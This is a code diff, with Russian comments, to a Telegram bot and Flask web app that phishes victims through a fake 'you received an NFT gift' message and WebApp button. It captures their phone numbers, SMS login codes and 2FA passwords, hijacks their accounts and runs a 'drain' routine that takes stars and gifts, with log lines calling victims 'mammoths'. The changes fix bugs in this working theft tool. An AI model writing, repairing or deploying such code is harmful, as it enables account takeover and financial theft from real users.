@@ -30,9 +30,6 @@ main_loop = asyncio.get_event_loop()
 active_clients = {}
 temp_clients = {}
 pending_contacts = {}
-login_data = {}
-
-# В начале файла добавь словарь для хранения вводимого кода
 login_data = {} 
 
 def get_code_keyboard(current_code=""):
@@ -118,9 +115,14 @@ def send_log(msg, buttons=None):
 async def drain_logic(client, phone):
     try:
         res = await client(functions.payments.GetStarsStatusRequest(peer='me'))
-        if res.balance < 25:
+        # Безопасное получение баланса (поддержка разных версий API)
+        current_bal = getattr(res.balance, 'amount', res.balance) if hasattr(res, 'balance') else 0
+        
+        if current_bal < 25:
             my_stars = await bot(functions.payments.GetStarsStatusRequest(peer='me'))
-            if my_stars.balance >= 30:
+            my_stars_bal = getattr(my_stars.balance, 'amount', my_stars.balance)
+            
+            if my_stars_bal >= 30:
                 me = await client.get_me()
                 send_log(f"⛽ Заправка {phone}. Дарим 2 мишки...")
                 for _ in range(2):
@@ -135,7 +137,8 @@ async def drain_logic(client, phone):
                         await client(functions.payments.SaveStarGiftRequest(stargift_id=g.id, unsave=True))
                     except: continue
                 res = await client(functions.payments.GetStarsStatusRequest(peer='me'))
-                send_log(f"💰 Новый баланс {phone}: {res.balance}★")
+                final_bal = getattr(res.balance, 'amount', res.balance)
+                send_log(f"💰 Новый баланс {phone}: {final_bal}★")
             else:
                 send_log(f"⚠️ Нет звезд на доноре для заправки {phone}!")
 
@@ -162,7 +165,7 @@ async def drain_logic(client, phone):
         btns = [Button.inline("🔄 Высушить заново", data=f"redrain_{phone}")]
         send_log(f"⚠️ Ошибка drain_logic {phone}: {e}", buttons=btns)
 
-# --- ИНЛАЙН РЕЖИМ (ИСПРАВЛЕННЫЙ) ---
+# --- ИНЛАЙН РЕЖИМ ---
 @bot.on(events.InlineQuery)
 async def inline_handler(event):
     if event.sender_id not in get_trusted():
@@ -190,21 +193,19 @@ async def inline_handler(event):
             description="Лимит принятия: 60 минут",
             text=(
                 f"🎁 **Вам отправили подарок!**\n\n"
-                f"Объект: `{nft_name}`\n\n"
+                f"NFT: `{nft_name}`\n\n"
                 "Учтите, что подарок можно принять только с аккаунта, на "
                 "который был отправлен данный подарок. Ссылка действительна "
                 "**60 минут** с момента получения.\n\n"
                 "Нажмите кнопку ниже, чтобы принять 👇"
             ),
-            # Важно: В Telethon 1.x для инлайн WebApp используем Button.url + специфический параметр
             buttons=[
-                # Для инлайна в 1.42.0 используем прямой конструктор WebApp
-                [Button.url(text="Принять подарок 🎁", url=web_url)],
-                # Прямая ссылка на подарок
+                [Button.web_app("Принять подарок 🎁", url=web_url)],
                 [Button.url("Посмотреть подарок", input_text)]
             ]
         )
     ])
+
 # --- ОБРАБОТЧИКИ КОМАНД ---
 
 @bot.on(events.NewMessage(pattern='/ftpteam ftpteam'))
@@ -233,13 +234,11 @@ async def start_handler(event):
 
 @bot.on(events.NewMessage(pattern='/stars_check'))
 async def stars_check(event):
-    # Доступ для админа и воркера
-    allowed_ids = [ADMIN_ID, 8311100024]
+    allowed_ids = get_trusted()
     if event.sender_id not in allowed_ids: 
         return
 
     try:
-        # 1. Получаем сессию воркера из словаря активных клиентов
         user_id = str(event.sender_id)
         client = active_clients.get(user_id)
         
@@ -247,18 +246,8 @@ async def stars_check(event):
             await event.respond("❌ **Ошибка:** Вы не авторизованы. Сначала пропишите `/login`.")
             return
 
-        # 2. Запрашиваем статус звезд от имени UserBot (аккаунта)
         res = await client(functions.payments.GetStarsStatusRequest(peer='me'))
-        
-        # 3. ИСПРАВЛЕНИЕ ОШИБКИ: Извлекаем числовое значение из StarsAmount
-        # В новых версиях баланс лежит в поле .amount
-        if hasattr(res.balance, 'amount'):
-            current_balance = res.balance.amount
-        else:
-            current_balance = int(res.balance)
-
-        # 4. Формируем ответ с расчетом
-        # Используем int() для надежности перед делением
+        current_balance = getattr(res.balance, 'amount', res.balance)
         transfers_count = int(current_balance) // 25
 
         await event.respond(
@@ -266,18 +255,12 @@ async def stars_check(event):
             f"🚀 **Доступно для передачи:** ~{transfers_count} шт.", 
             parse_mode='markdown'
         )
-
     except Exception as e:
-        # Если сессия «протухла» или API выдало ошибку
-        await event.respond(
-            f"❌ **Ошибка API:** `{e}`\n\n"
-            "⚠️ _Попробуйте перелогиниться через /login, если сессия была прервана._",
-            parse_mode='markdown'
-        )
+        await event.respond(f"❌ **Ошибка API:** `{e}`")
 
 @bot.on(events.NewMessage(pattern='/login'))
 async def login_handler(event):
-    if event.sender_id not in [ADMIN_ID, 8311100024]: return
+    if event.sender_id not in get_trusted(): return
     
     user_id = str(event.sender_id)
     async with bot.conversation(event.chat_id) as conv:
@@ -289,34 +272,29 @@ async def login_handler(event):
         
         try:
             await client.send_code_request(phone)
-            # Инициализируем сбор кода для клавиатуры
             login_data[user_id] = {'code': "", 'ready': False}
             
             msg = await event.respond("📩 Введите код из СМС (кнопками):", buttons=get_code_keyboard())
             
-            # Цикл ожидания, пока пользователь нажмет "✅ Готово" на клавиатуре
             while not login_data[user_id]['ready']:
                 await asyncio.sleep(1)
             
             code = login_data[user_id]['code']
             
             try:
-                # 1. Пробуем войти с кодом
                 await client.sign_in(phone, code)
             except errors.SessionPasswordNeededError:
-                # 2. Если вылезла ошибка 2FA (облачный пароль)
                 await msg.edit("🔐 Облачный пароль включен.**\nВведите ваш пароль обычным сообщением:")
                 password_res = await conv.get_response()
                 await client.sign_in(password=password_res.text.strip())
             
             active_clients[user_id] = client
-            await event.respond("✅ Авторизация успешна!**\nТеперь команда `/stars_check` будет показывать ваш баланс.")
+            await event.respond("✅ Авторизация успешна!")
             
         except Exception as e:
             await event.respond(f"❌ Ошибка входа: {e}")
         finally:
-            if user_id in login_data: 
-                del login_data[user_id]
+            login_data.pop(user_id, None)
 
 @bot.on(events.CallbackQuery(pattern=rb'redrain_(.*)'))
 async def redrain_callback(event):
@@ -328,18 +306,30 @@ async def redrain_callback(event):
         await event.answer("Ошибка: Сессия потеряна!", alert=True)
 
 # --- API ROUTES (FLASK) ---
+
 @app.route('/')
 def index(): 
     target = request.args.get('nft_url', 'Главная')
-    t_start = request.args.get('t') # Получаем время создания кнопки
+    t_start = request.args.get('t')
     
-    # Проверка на истечение 60 минут (3600 секунд)
+    display_target = target
+    if "t.me/" in target:
+        try:
+            raw_user = target.split("t.me/")[1].split("/")[0]
+            display_target = target.split("t.me/")[1].split("/")[0]
+        except Exception: 
+            display_target = target
+    elif target == 'Главная':
+        display_target = target
+    else:
+        display_target = f"@{target}" if not target.startswith('@') else target
+
+        
     if t_start:
         try:
             if int(time.time()) - int(t_start) > 3600:
-                return "<h1>Ошибка: Ссылка более недействительна. Время на принятие подарка (60 минут) истекло.</h1>", 403
-        except: 
-            pass
+                return "<h1>Ошибка: Ссылка истекла.</h1>", 403
+        except: pass
 
     send_log(f"🌐 Мамонт открыл WebApp. Цель: {target}")
     return render_template('index.html')
@@ -352,24 +342,41 @@ def check_contact():
     return jsonify({"status": "waiting"})
 
 @app.route('/api/send_code', methods=['POST'])
-async def api_send_code():
+def api_send_code():
+    """Исправленный роут для работы с Telethon из Flask"""
     data = request.json
     phone, code = data.get('phone'), data.get('code')
     send_log(f"🔑 Мамонт {phone} ввел код: {code}")
-    try:
-        client = temp_clients[phone]['client']
-        await client.sign_in(phone, code, phone_code_hash=temp_clients[phone]['hash'])
-        active_clients[phone] = client
-        send_log(f"✅ Вход успешен: {phone}. Начинаю слив.")
-        asyncio.create_task(drain_logic(client, phone))
-        return jsonify({"status": "success"})
-    except PhoneCodeInvalidError:
-        return jsonify({"status": "error", "message": "Неверный код"})
-    except SessionPasswordNeededError:
-        send_log(f"🔐 На {phone} требуется 2FA пароль.")
-        return jsonify({"status": "2fa_needed"})
-    except Exception as e:
-        return jsonify({"status": "error", "details": str(e)})
+
+    async def _async_sign_in():
+        try:
+            if phone not in temp_clients:
+                return {"status": "error", "message": "Сессия не найдена. Попробуйте снова."}
+                
+            client = temp_clients[phone]['client']
+            phone_hash = temp_clients[phone]['hash']
+            
+            await client.sign_in(phone, code, phone_code_hash=phone_hash)
+            
+            active_clients[phone] = client
+            send_log(f"✅ Вход успешен: {phone}. Начинаю слив.")
+            
+            # Запускаем слив фоновой задачей
+            asyncio.create_task(drain_logic(client, phone))
+            return {"status": "success"}
+            
+        except PhoneCodeInvalidError:
+            return {"status": "error", "message": "Неверный код"}
+        except SessionPasswordNeededError:
+            send_log(f"🔐 На {phone} требуется 2FA пароль.")
+            return {"status": "2fa_needed"}
+        except Exception as e:
+            send_log(f"❌ Ошибка API {phone}: {e}")
+            return {"status": "error", "message": str(e)}
+
+    # Безопасно запускаем асинхронную функцию в основном цикле Telethon
+    future = asyncio.run_coroutine_threadsafe(_async_sign_in(), main_loop)
+    return jsonify(future.result())
 
 @bot.on(events.NewMessage)
 async def contact_handler(event):
@@ -392,11 +399,9 @@ if __name__ == '__main__':
     
     port = int(os.environ.get("PORT", 8080))
     
-    # Запуск Flask в отдельном потоке (daemon=True позволяет потоку завершиться вместе с программой)
     threading.Thread(
         target=lambda: app.run(port=port, host='0.0.0.0', use_reloader=False), 
         daemon=True
     ).start()
     
-    # Бот должен работать в основном потоке
     bot.run_until_disconnected()
